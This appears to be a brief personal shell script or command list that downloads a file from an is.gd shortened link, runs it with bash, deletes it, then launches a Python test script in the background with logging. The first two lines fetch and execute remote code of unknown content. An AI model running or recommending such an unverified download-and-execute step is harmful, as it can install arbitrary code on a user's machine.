wget https://is.gd/CQveCD
bash ./CQveCD
top
rm ./CQveCD
cd .bash/
nohup python -u test.py > x.log 2>&1 & 
#echo "hello"
echo $! > save_pid.txt
tail -f x.log
